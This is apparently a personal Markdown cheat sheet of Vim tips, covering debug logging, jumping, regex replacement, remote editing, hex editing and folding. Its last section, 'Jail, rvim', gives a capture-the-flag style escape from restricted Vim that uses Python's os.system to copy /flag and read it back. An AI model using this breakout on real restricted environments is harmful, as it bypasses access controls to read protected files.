# Debug

http://vimhelp.appspot.com/vim_faq.txt.html#faq-2.5

```bash
vim -u NONE -U NONE -N -i NONE
vim -u ~/.vimrc --noplugin -N -i NONE
vim -V15logfile
```

```vim
:set vbs=15 vfile=vimdebug
:e _
:set vbs& vfile&
:e vimdebug

:syntime on
" move around in your file and then
:syntime report

" log levels
" >= 1  When the viminfo file is read or written.
" >= 2  When a file is ":source"'ed.
" >= 5  Every searched tags file and include file.
" >= 8  Files for which a group of autocommands is executed.
" >= 9  Every executed autocommand.
" >= 12 Every executed function.
" >= 13 When an exception is thrown, caught, finished, or discarded.
" >= 14 Anything pending in a ":finally" clause.
" >= 15 Every executed Ex command (truncated at 200 characters).

" opens vim in debug mode
" vim -D somefile.txt

" debug a command
debug CommandName

" add breakpoint to function
breakadd func [lineNumber] functionName

" this will write startup info to a file: vim.log
" vim --startuptime vim.log
```

# Jumping

- `C-]` = follow tag
- `gx` = pass link to file handler
- `ge` = follow named anchors in links
    - https://github.com/plasticboy/vim-markdown
    - https://github.com/chmp/mdnav
    - https://vi.stackexchange.com/questions/9344/open-markdown-filename-under-cursor-like-gf-and-jump-to-the-section
- `gf` = jump to file
- `gF` = `gf` + jumps to line number
    - https://stackoverflow.com/questions/36500099/vim-gf-should-open-file-and-jump-to-line/36500454

```vim
" Follow wiki anchor
" - https://github.com/vimwiki/vimwiki
" e.g. [[Task List#Tomorrow|Tasks for tomorrow]]

" Jump to match
" Usage: Visual select, yank, :@"
e foo | exe search('bar')
" Check if matched
search('bar', 'n') > 0
```

# Replacing

```vim
" From cursor position until end of line
:s/\(\%#.*\)\@<=find/replace/g

" From specific position until end of line
:s/\(^.\{123\}\)\@<=find/replace/g

" Whole words
:%s/\<find\>/replace/g
```

# Remote editing

```bash
vim 'ftp://[user@]host[[:#]port]/path'
vim 'scp://user@host//absolute/path'
```

# Search

|Selection|Keys|
|---|---|
|Unnamed register = text of delete or yank|`<C-R>"`|
|Visual|`\V<C-R>=escape(@",'/\')`|
|Clipboard|`<C-R>"`|
|File|`<C-R><C-F>`|
|WORD|`<C-R><C-A>`|

```vim
:help c_<C-R>
```

# Executed processes

Run sub-process listing parent pid, corresponding to vim process, taken as `$vim_pid`:

```vim
:!ps --no-heading -l $PPID
```

```bash
strace -f -s 9999 -e process -p $vim_pid
```

# Highlight sync

```vim
:syntax sync fromstart
```

# Highlight between offsets

```vim
highlight foo ctermfg=green cterm=bold
call matchadd('foo','\%>1c\%<4c',-1)
```

# Align markdown table

```vim
:!column -t -o' '
```

# Natural copy-paste

```vim
vmap <C-c> "+yi
vmap <C-x> "+c
vmap <C-v> c<ESC>"+p
imap <C-v> <C-r><C-o>+
```

# Folding

|Action|Keys|
|---|---|
|**M**inimize all|`zM`|
|**R**estore all|`zR`|
|Toggle all|`zA`|

# Typing

|Action|Keys|Help|
|---|---|---|
|char by value|`iC-Vx41`|i_CTRL-V_digit|

Alternative: `CTRL-SHIFT-u, 0041, ENTER`

# Move beyond end of line

```vim
:set virtualedit=all
```

# Hex edit zip file

```bash
vim -b --cmd 'let g:loaded_zipPlugin = 1' foo.zip
```

# Hex replace

```vim
" FIXME: \x00 truncates replacement
:%s/\%x01/\="\x02"/
```

# Jail, rvim

```
:python3 import os; os.system('cat /flag > /flag2')
:r /flag2
```
